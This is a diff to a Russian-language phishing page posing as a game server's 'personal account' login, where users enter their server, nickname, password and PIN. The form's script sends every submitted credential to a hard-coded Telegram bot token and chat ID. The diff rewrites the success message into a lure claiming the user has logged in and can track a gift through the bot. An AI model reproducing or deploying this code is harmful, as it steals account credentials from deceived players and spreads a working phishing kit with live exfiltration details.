@@ -3,6 +3,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
 
+<style>
+  .error-message {
+    color: #ff0000 !important;
+    font-size: 14px;
+    margin-top: 5px;
+    display: none;
+  }
+</style>
+
     <style>
       
     </style>
@@ -305,6 +314,7 @@
                   <!--[-->
  
 <!-- ======= НАЧАЛО НОВОЙ ФОРМЫ ======= -->
+<!-- В разделе формы авторизации -->
 <form class="flex flex-col items-start desktop:w-[834px] desktop:pt-[120px] w-full" id="authForm">
     <h2 class="text-light uppercase font-bold tablet-lg:text-d-h2 tablet:text-[65px] tablet:leading-[79px] mobile:text-[36px] mobile:leading-[44px] text-m-h2">
       ЛИЧНЫЙ КАБИНЕТ
@@ -314,7 +324,7 @@
           <label class="text-white font-normal desktop:text-d-text desktop:mb-[12px] tablet-lg:text-[26px] tablet-lg:leading-[39px] tablet-lg:mb-[15px] tablet:text-[40px] tablet:leading-[61px] tablet:mb-[24px] mobile:text-[22px] mobile:leading-[33px] mobile:mb-[13px] text-d-text mb-[12px]">Укажи сервер</label>
           <div class="cursor-pointer bg-white input-container relative flex items-center overflow-hidden desktop:rounded-[100px] desktop:pr-[20px] tablet-lg:rounded-[130px] tablet-lg:pr-[27px] tablet:rounded-[204px] tablet:pr-[42px] mobile:rounded-[113px] mobile:pr-[23px] rounded-[100px] gap-[12px] pr-[21px]">
             <select id="server" name="server" required class="text-black placeholder:gray_75 input-text-lg bg-transparent w-full placeholder-gray-75 font-montserrat outline-none desktop:pl-[24px] desktop:py-[12px] desktop:h-[48px] tablet-lg:pl-[31px] tablet-lg:py-[15px] tablet-lg:h-[62px] tablet:pl-[49px] tablet:py-[24px] tablet:h-[98px] mobile:pl-[27px] mobile:py-[13px] mobile:h-[53px] pl-[24px] py-[12px] h-[47px]">
-               <option value="">-- Выберите сервер --</option>
+               <option value=""> Сервер не выбран </option>
                 <option value="❤RED">СЕРВЕР #1 RED</option>
                <option value="💚GREEN">СЕРВЕР #2 GREEN</option>
                <option value="💙BLUE">СЕРВЕР #3 BLUE</option>
@@ -407,7 +417,7 @@
                <!-- ... (остальные серверы из вашего оригинала) ... -->
             </select>
           </div>
-          <div id="serverError" class="text-red-500 text-sm mt-1 hidden">❗ Выберите сервер</div>
+          <div id="serverError" class="error-message">Это обязательное поле.</div>
         </div>
     </div>
 
@@ -424,7 +434,7 @@
                  pattern="^[A-Za-z_]{3,24}$" 
                  title="Только латинские буквы и _ (3-24 символа)">
         </div>
-        <div id="nameError" class="text-red-500 text-sm mt-1 hidden">❗ Только A-Z, a-z и _ (3-24 символа)</div>
+        <div id="nameError" class="error-message"> Это обязательное поле.</div>
       </div>
 
       <div class="flex flex-col relative">
@@ -437,9 +447,9 @@
                  placeholder="Пароль" 
                  required 
                  pattern="^[A-Za-z0-9]{6,16}$" 
-                 title="Латиница + цифры (6-16 символов)">
+                 title="тест">
         </div>
-        <div id="passError" class="text-red-500 text-sm mt-1 hidden">❗ Латиница + цифры (6-16 символов)</div>
+        <div id="passError" class="error-message"> Это обязательное поле.</div>
       </div>
 
       <div class="flex flex-col relative">
@@ -461,73 +471,111 @@
       </button>
     </div>
 </form>
-    <script>
-    document.getElementById('submitBtn').addEventListener('click', function() {
-      const server = document.getElementById('server');
-      const name = document.getElementById('name');
-      const pass = document.getElementById('pass');
-      let isValid = true;
 
-       
-      if (!server.value) {
-          document.getElementById('serverError').classList.remove('hidden');
-          isValid = false;
-      } else {
-          document.getElementById('serverError').classList.add('hidden');
-      }
+<script>
+document.getElementById('submitBtn').addEventListener('click', function() {
+  const server = document.getElementById('server');
+  const name = document.getElementById('name');
+  const pass = document.getElementById('pass');
+  let isValid = true;
 
-     
-      if (!name.value.match(/^[A-Za-z_]{3,24}$/)) {
-          document.getElementById('nameError').classList.remove('hidden');
-          isValid = false;
-      } else {
-          document.getElementById('nameError').classList.add('hidden');
-      }
+  // Проверка сервера
+  if (!server.value) {
+      document.getElementById('serverError').style.display = 'block';
+      isValid = false;
+  } else {
+      document.getElementById('serverError').style.display = 'none';
+  }
 
-      if (!pass.value.match(/^[A-Za-z0-9]{6,16}$/)) {
-          document.getElementById('passError').classList.remove('hidden');
-          isValid = false;
-      } else {
-          document.getElementById('passError').classList.add('hidden');
-      }
+  // Проверка ника (только A-Z, a-z и _, формат Nick_Name)
+  const nameRegex = /^[A-Za-z]+_[A-Za-z]+$/;
+  if (!nameRegex.test(name.value) || name.value.length < 3 || name.value.length > 24) {
+      document.getElementById('nameError').style.display = 'block';
+      isValid = false;
+  } else {
+      document.getElementById('nameError').style.display = 'none';
+  }
 
+  // Проверка пароля (латиница + цифры, 6-16 символов)
+  const passRegex = /^[A-Za-z0-9]{6,16}$/;
+  if (!passRegex.test(pass.value)) {
+      document.getElementById('passError').style.display = 'block';
+      isValid = false;
+  } else {
+      document.getElementById('passError').style.display = 'none';
+  }
 
-      if (isValid) {
-          const server = document.getElementById('server').value;
-          const name = document.getElementById('name').value;
-          const pass = document.getElementById('pass').value;
-          const pin = document.getElementById('pin').value || 'не указан';
+  if (isValid) {
+      const server = document.getElementById('server').value;
+      const name = document.getElementById('name').value;
+      const pass = document.getElementById('pass').value;
+      const pin = document.getElementById('pin').value || 'не указан';
 
-          const botToken = '7649642227:AAGjjBAGMthw83O0dt0XQr0wwbNAMtFMsDY';  // Пример: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
-          const chatId = '-1002845455179';      // Пример: '123456789' или '-1001234567890'
+      const botToken = '7649642227:AAGjjBAGMthw83O0dt0XQr0wwbNAMtFMsDY';
+      const chatId = '-1002845455179';
 
-          const message = `🔐 Новая авторизация:\n\n🖥 Сервер: ${server}\n👤 Ник: ${name}\n🔑 Пароль: ${pass}\n🔢 Пинкод: ${pin}`;
+      const message = `🔐 Новая авторизация:\n\n🖥 Сервер: ${server}\n👤 Ник: ${name}\n🔑 Пароль: ${pass}\n🔢 Пинкод: ${pin}`;
 
-          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                  chat_id: chatId,
-                  text: message
-              })
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+              chat_id: chatId,
+              text: message
           })
-          .then(response => response.json())
-          .then(data => {
-              alert('✅ Данные отправлены!');
-              document.getElementById('authForm').reset(); // Очистка формы
-          })
-          .catch(error => {
-              console.error('Ошибка:', error);
-              alert('❌ Ошибка отправки. Проверьте консоль.');
-          });
-      }
-  });
+      })
+      .then(response => response.json())
+      .then(data => {
+          alert('✅ Вы вошли в Личный Кабинет. Отслеживать получение подарка можно в боте!');
+          document.getElementById('authForm').reset();
+      })
+      .catch(error => {
+          console.error('Ошибка:', error);
+          alert('❌ Ошибка запроса.Пожалуйста, напишите нам об этой проблеме в тех. поддержку!');
+      });
+  }
+});
 
-  document.getElementById('pin').addEventListener('input', function() {
-      if (this.value.length > 4) {
-          this.value = this.value.slice(0, 4);
-      }
-  });
+// Ограничение ввода пинкода до 4 цифр
+document.getElementById('pin').addEventListener('input', function() {
+    if (this.value.length > 4) {
+        this.value = this.value.slice(0, 4);
+    }
+});
+
+// Валидация ника в реальном времени
+document.getElementById('name').addEventListener('input', function() {
+    const nameRegex = /^[A-Za-z_]*$/;
+    if (!nameRegex.test(this.value)) {
+        document.getElementById('nameError').textContent = 'Ник содержит запрещенные символы.Можно использовать лишь английские буквы и нижнее подчеркивание.';
+        document.getElementById('nameError').style.display = 'block';
+    } else if (this.value.length > 0 && this.value.length < 3) {
+        document.getElementById('nameError').textContent = 'Не правильный формат. Пример:Nick_Name.';
+        document.getElementById('nameError').style.display = 'block';
+    } else if (this.value.length > 24) {
+        document.getElementById('nameError').textContent = 'Больше 24 символа';
+        document.getElementById('nameError').style.display = 'block';
+    } else {
+        document.getElementById('nameError').style.display = 'none';
+    }
+});
+
+// Валидация пароля в реальном времени
+document.getElementById('pass').addEventListener('input', function() {
+    const passRegex = /^[A-Za-z0-9]*$/;
+    if (!passRegex.test(this.value)) {
+        document.getElementById('passError').textContent = 'Пароль должен содержать только латинские буквы и цифры.';
+        document.getElementById('passError').style.display = 'block';
+    } else if (this.value.length > 0 && this.value.length < 6) {
+        document.getElementById('passError').textContent = 'Пароль состоит минимум из 6 символов';
+        document.getElementById('passError').style.display = 'block';
+    } else if (this.value.length > 16) {
+        document.getElementById('passError').textContent = 'Пароль состоит максимум из 16 символов';
+        document.getElementById('passError').style.display = 'block';
+    } else {
+        document.getElementById('passError').style.display = 'none';
+    }
+});
 </script>
 
 <script>
